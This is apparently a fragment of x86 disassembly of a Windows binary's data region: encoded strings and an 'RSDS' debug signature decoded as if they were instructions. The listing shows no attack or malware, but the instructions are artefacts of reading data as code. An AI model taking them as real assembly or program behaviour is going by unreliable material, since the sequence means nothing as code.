  43378b:	xor    dh,BYTE PTR [eax+eax*1]
  43378e:	dec    esi
  43378f:	ss dec edx
  433791:	pop    edi
  433792:	dec    ecx
  433793:	dec    esp
  433794:	inc    edi
  433795:	inc    esp
  433796:	dec    eax
  433797:	xor    BYTE PTR [eax],bh
  433799:	xor    eax,0x4c344f00
  43379e:	xor    esi,DWORD PTR [edi]
  4337a0:	xor    BYTE PTR [edi+0x44],bl
  4337a3:	inc    edi
  4337a4:	dec    ebx
  4337a5:	xor    al,BYTE PTR [ecx+0x43]
  4337a8:	add    BYTE PTR [edi+0x32],cl
  4337ab:	xor    ebx,DWORD PTR [edi+0x57]
  4337ae:	xor    cl,BYTE PTR [edi+0x5f]
  4337b1:	pop    edx
  4337b2:	add    BYTE PTR [eax+0x4c],bl
  4337b5:	cmp    DWORD PTR [edi+0x4b],ebx
  4337b8:	inc    ecx
  4337b9:	dec    edx
  4337ba:	inc    esi
  4337bb:	xor    DWORD PTR [edi+ebx*2],esi
  4337be:	pop    eax
  4337bf:	inc    edi
  4337c0:	inc    edx
  4337c1:	add    BYTE PTR [eax+0x33],dl
  4337c4:	dec    esi
  4337c5:	pop    edi
  4337c6:	dec    eax
  4337c7:	xor    eax,0x485f53
  4337cc:	dec    ebp
  4337cd:	xor    BYTE PTR [edx+0x5f],al
  4337d0:	dec    edx
  4337d1:	pop    eax
  4337d2:	push   esp
  4337d3:	dec    ecx
  4337d4:	dec    esp
  4337d5:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  4337d9:	xor    esi,DWORD PTR [eax]
  4337db:	pop    edi
  4337dc:	inc    ecx
  4337dd:	pop    edx
  4337de:	push   ecx
  4337df:	pop    edx
  4337e0:	cmp    DWORD PTR [esi],esi
  4337e2:	pop    edi
  4337e3:	dec    eax
  4337e4:	dec    esp
  4337e5:	pop    edx
  4337e6:	add    BYTE PTR [ecx+0x57],dl
  4337e9:	pop    ecx
  4337ea:	pop    edi
  4337eb:	push   esi
  4337ec:	xor    al,0x44
  4337ee:	xor    DWORD PTR [eax],edi
  4337f0:	xor    bl,BYTE PTR [edi+0x39]
  4337f3:	push   esp
  4337f4:	push   esp
  4337f5:	add    BYTE PTR [esi+0x0],dl
  4337f8:	dec    edi
  4337f9:	add    BYTE PTR [edi+0x0],al
  4337fc:	add    BYTE PTR ss:[edi+0x0],bl
  433800:	dec    edi
  433801:	add    BYTE PTR [edx+0x0],bl
  433804:	inc    ebp
  433805:	add    BYTE PTR [eax],dh
  433807:	add    BYTE PTR [ebp+0x0],al
  43380a:	xor    BYTE PTR [eax],al
  43380c:	pop    edi
  43380d:	add    BYTE PTR [eax],dh
  43380f:	add    BYTE PTR ds:0x4f000000,dh
  433815:	add    BYTE PTR ds:0x5f005700,dh
  43381b:	add    BYTE PTR [edi],dh
  43381d:	add    BYTE PTR [ebx+0x0],dl
  433820:	push   ebp
  433821:	add    BYTE PTR [edi+0x0],al
  433824:	xor    al,0x0
  433826:	pop    edi
  433827:	add    BYTE PTR [ecx+0x0],dl
  43382a:	inc    esp
  43382b:	add    BYTE PTR [eax],al
  43382d:	add    BYTE PTR [edx+0x0],dl
  433830:	push   esp
  433831:	add    BYTE PTR ds:0x52005f00,dh
  433837:	add    BYTE PTR [edi+0x0],dl
  43383a:	xor    al,BYTE PTR [eax]
  43383c:	xor    al,BYTE PTR [eax]
  43383e:	xor    BYTE PTR [eax],al
  433840:	xor    BYTE PTR [eax],al
  433842:	pop    edi
  433843:	add    BYTE PTR [esi],dh
  433845:	add    BYTE PTR [eax],al
  433847:	add    BYTE PTR [eax+0x0],cl
  43384a:	inc    ebp
  43384b:	add    BYTE PTR [eax+eax*1+0x30],cl
  43384f:	add    BYTE PTR [edi+0x0],bl
  433852:	dec    edx
  433853:	add    BYTE PTR [edx],dh
  433855:	add    BYTE PTR [edi],dh
  433857:	add    BYTE PTR [ebp+0x0],dl
  43385a:	add    BYTE PTR ss:[eax],dh
  43385d:	add    BYTE PTR [eax],al
  43385f:	add    BYTE PTR [esi+0x0],dl
  433862:	cmp    BYTE PTR [eax],al
  433864:	dec    edi
  433865:	add    BYTE PTR [ecx],bh
  433867:	add    BYTE PTR [edi+0x0],bl
  43386a:	pop    eax
  43386b:	add    BYTE PTR [edx+0x0],bl
  43386e:	dec    esp
  43386f:	add    BYTE PTR [ebx+0x0],cl
  433872:	add    BYTE PTR [eax],al
  433874:	dec    ecx
  433875:	add    BYTE PTR [ebp+0x0],dl
  433878:	dec    edi
  433879:	add    BYTE PTR [eax],bh
  43387b:	add    BYTE PTR [edi+0x0],bl
  43387e:	inc    esp
  43387f:	add    BYTE PTR [eax],bh
  433881:	add    BYTE PTR [ecx+0x0],cl
  433884:	dec    eax
  433885:	add    BYTE PTR [edi+0x0],cl
  433888:	pop    edi
  433889:	add    BYTE PTR [ebp+0x0],al
  43388c:	pop    eax
  43388d:	add    BYTE PTR [eax],al
  43388f:	add    BYTE PTR [edx+0x0],dl
  433892:	dec    esp
  433893:	add    BYTE PTR [esi],dh
  433895:	add    BYTE PTR [edi+0x0],bl
  433898:	aaa    
  433899:	add    BYTE PTR [eax+0x0],bl
  43389c:	xor    eax,DWORD PTR [eax]
  43389e:	inc    edi
  43389f:	add    BYTE PTR [ecx+0x0],dl
  4338a2:	pop    edi
  4338a3:	add    BYTE PTR [edx+0x0],cl
  4338a6:	add    BYTE PTR [eax],al
  4338a8:	inc    edi
  4338a9:	add    BYTE PTR [edi+0x0],cl
  4338ac:	push   ebx
  4338ad:	add    BYTE PTR [eax+eax*1],dh
  4338b0:	pop    edi
  4338b1:	add    BYTE PTR [ecx+0x0],cl
  4338b4:	xor    DWORD PTR [eax],eax
  4338b6:	push   esi
  4338b7:	add    BYTE PTR [ebx],dh
  4338b9:	add    BYTE PTR [edi+0x0],bl
  4338bc:	dec    ecx
  4338bd:	add    BYTE PTR [edx+0x0],bl
  4338c0:	add    BYTE PTR [eax],al
  4338c2:	inc    ebx
  4338c3:	add    BYTE PTR [ecx+0x0],bl
  4338c6:	inc    ecx
  4338c7:	add    BYTE PTR [eax],dh
  4338c9:	add    BYTE PTR [ecx],bh
  4338cb:	add    BYTE PTR [edi+0x0],bl
  4338ce:	cmp    DWORD PTR [eax],eax
  4338d0:	push   eax
  4338d1:	add    BYTE PTR [eax+eax*1],dh
  4338d4:	pop    edx
  4338d5:	add    BYTE PTR [eax],al
  4338d7:	add    BYTE PTR [edx+0x0],al
  4338da:	inc    esi
  4338db:	add    BYTE PTR [eax+eax*1+0x5f],dl
  4338df:	add    BYTE PTR [ebp+0x0],dl
  4338e2:	push   ebp
  4338e3:	add    BYTE PTR [eax+eax*1+0x57],dl
  4338e7:	add    BYTE PTR [eax],al
  4338e9:	add    BYTE PTR [eax+eax*1+0x37],dl
  4338ed:	add    BYTE PTR [eax+eax*1+0x38],dl
  4338f1:	add    BYTE PTR [edi+0x0],bl
  4338f4:	xor    eax,DWORD PTR [eax]
  4338f6:	cmp    DWORD PTR [eax],eax
  4338f8:	dec    eax
  4338f9:	add    BYTE PTR [edi+0x0],bl
  4338fc:	dec    ebp
  4338fd:	add    BYTE PTR [ecx+0x0],bl
  433900:	cmp    DWORD PTR [eax],eax
  433902:	inc    ecx
  433903:	add    BYTE PTR [esi+0x0],cl
  433906:	add    BYTE PTR [eax],al
  433908:	inc    ebx
  433909:	add    BYTE PTR [eax+0x0],dl
  43390c:	dec    esi
  43390d:	add    BYTE PTR [eax+eax*1],dh
  433910:	pop    edi
  433911:	add    BYTE PTR [eax+eax*1+0x54],cl
  433915:	add    BYTE PTR [ebx+0x0],cl
  433918:	xor    DWORD PTR [eax],eax
  43391a:	add    BYTE PTR [eax],al
  43391c:	inc    ecx
  43391d:	add    BYTE PTR [edi],dh
  43391f:	add    BYTE PTR [edx+0x0],cl
  433922:	pop    edi
  433923:	add    BYTE PTR [ebx+0x0],al
  433926:	cmp    BYTE PTR [eax],al
  433928:	push   edi
  433929:	add    BYTE PTR [eax+0x0],dl
  43392c:	pop    edi
  43392d:	add    BYTE PTR [eax+eax*1+0x4e],cl
  433931:	add    BYTE PTR [edx],dh
  433933:	add    BYTE PTR [eax],al
  433935:	add    BYTE PTR [edx+0x0],al
  433938:	add    BYTE PTR [eax],al
  43393a:	push   edx
  43393b:	push   ebx
  43393c:	inc    esp
  43393d:	push   ebx
  43393e:	and    al,0x2d
  433940:	retf   0x7e5c
  433943:	lock repnz dec ebx
  433946:	sbb    BYTE PTR [edi+0x982d6f2],0x60
  43394d:	cmp    BYTE PTR [ebx],dl
  43394f:	add    BYTE PTR [eax],al
  433951:	add    BYTE PTR [edi+0x3a],cl
  433954:	pop    esp
  433955:	jno    0x4339ab
  433957:	inc    esp
  433958:	jp     0x4339a8
  43395a:	jb     0x4339b6
  43395c:	addr16 jne 0x4339c2
  43395f:	jns    0x4339d1
  433961:	jbe    0x4339bf
  433963:	push   0x62
  433965:	push   edi
  433966:	jns    0x4339e0
  433968:	inc    ebp
  433969:	ins    DWORD PTR es:[edi],dx
  43396a:	jbe    0x4339d3
  43396c:	popa   
  43396d:	pop    esp
  43396e:	je     0x4339da
  433970:	pop    edx
  433971:	data16 jne 0x4339e6
  433974:	ja     0x4339de
  433976:	push   edx
  433977:	bound  eax,QWORD PTR [ebp+0x72]
  43397a:	pop    esp
  43397b:	dec    edx
  43397c:	jae    0x4339c2
  43397e:	ins    DWORD PTR es:[edi],dx
  43397f:	imul   ebp,DWORD PTR [eax+0x62],0x2e
  433983:	jo     0x4339e9
  433985:	bound  eax,QWORD PTR [eax]
	...
